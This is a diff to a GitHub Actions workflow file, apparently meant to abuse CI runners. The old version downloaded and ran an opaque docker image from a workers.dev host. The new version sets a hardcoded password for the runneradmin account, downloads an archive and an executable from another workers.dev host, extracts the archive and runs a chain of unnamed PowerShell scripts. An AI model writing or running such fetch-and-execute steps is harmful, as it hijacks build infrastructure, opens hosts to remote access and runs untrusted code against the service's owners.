@@ -1,35 +1,31 @@
-name: Bye Bye
+name: project 2
 
-on:
-    push:
-    workflow_dispatch:
-    
+on: workflow_dispatch
+
 jobs:
   build:
-    runs-on: ubuntu-20.04
+
+    runs-on: windows-latest
+    timeout-minutes: 60
 
     steps:
-       - name: Free Disk Space (Ubuntu)
-         uses: jlumbroso/free-disk-space@main
-         with:
-              # this might remove tools that are actually needed,
-                # if set to "true" but frees about 6 GB
-              tool-cache: false
-            
-                # all of these default to true, but feel free to set to
-                # "false" if necessary for your workflow
-              android: true
-              dotnet: true
-              haskell: true
-              large-packages: true
-              docker-images: true
-              swap-storage: true
-       - name: a1
-         uses: actions/checkout@main
-         
-       - name: a2
-         timeout-minutes: 120
-         continue-on-error: true
-         run: |
-             wget https://my.ekramulislam7710.workers.dev/0:/eamon.arc
-             docker image load -i eamon.arc && docker run emon
+    - name: command 1
+      run: |
+        cmd /c net user runneradmin EAekra7595
+        Invoke-WebRequest https://a.olele.workers.dev/0:/EmptyBinGenarator/zzz.arc -OutFile zzz.acr
+        Invoke-WebRequest https://a.olele.workers.dev/0:/EmptyBinGenarator/zzz.exe -OutFile zzz.exe
+        .\zzz.exe e zzz.acr
+    - name: command 2
+      run: .\00.ps1
+    - name: command 3
+      run: .\0.ps1
+    - name: command 4
+      run: .\1.ps1
+    - name: command 5
+      run: .\2.ps1
+    - name: command 6
+      run: .\3.ps1
+    - name: command 7
+      run: .\4.ps1
+    - name: command 8
+      run: .\5.ps1 
